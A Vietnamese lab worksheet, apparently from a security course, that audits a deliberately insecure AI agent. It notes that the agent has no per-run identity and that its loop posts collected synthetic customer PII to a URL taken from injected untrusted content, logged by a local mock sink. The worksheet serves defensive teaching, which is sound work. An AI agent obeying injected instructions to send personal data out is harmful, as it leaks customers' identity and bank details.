# Baseline — điền trong checkpoint 1

1. **Agent có identity mỗi run chưa? Dẫn file/hàm:**
   Chưa. Trong [agent/loop.py](file:///c:/Users/Admin/Desktop/K4-L3-DAY24-NgoKyAnh-2A202602916/agent/loop.py) hàm `_naive_loop()` (dòng 27–54), toàn bộ quy trình từ `search_docs`, `read_customer` đến `http_post` được thực thi mà không có bất kỳ định danh agent nào (`agent_id`, `run_id`) hay cơ chế xác thực principal theo từng run.

2. **Ai cho phép `http_post`? Dẫn file/hàm:**
   Không có ai cho phép. Trong [agent/loop.py](file:///c:/Users/Admin/Desktop/K4-L3-DAY24-NgoKyAnh-2A202602916/agent/loop.py) hàm `_naive_loop()` (dòng 44), lệnh gọi `tools.http_post(injected.target_url, {"records": collected})` được thực thi trực tiếp và hoàn toàn tự do theo chỉ thị trích xuất từ untrusted content mà không thông qua bất kỳ Policy Enforcement Point (PEP) hay cơ chế kiểm soát egress nào.

3. **Nếu gửi sai PII ra sink, bằng chứng ở đâu? Dẫn file/hàm:**
   Bằng chứng nằm tại `reports/sink.log` (và được snapshot vào `reports/attack-before.log`). Trong [sink/sink.py](file:///c:/Users/Admin/Desktop/K4-L3-DAY24-NgoKyAnh-2A202602916/sink/sink.py) hàm `make_handler.do_POST` (dòng 45–47), máy chủ mock sink ghi lại toàn bộ nội dung body của request POST gửi tới `http://127.0.0.1:10024/reconcile`, phơi bày CCCD, SĐT và STK của khách hàng synthetic `KH-000999`.
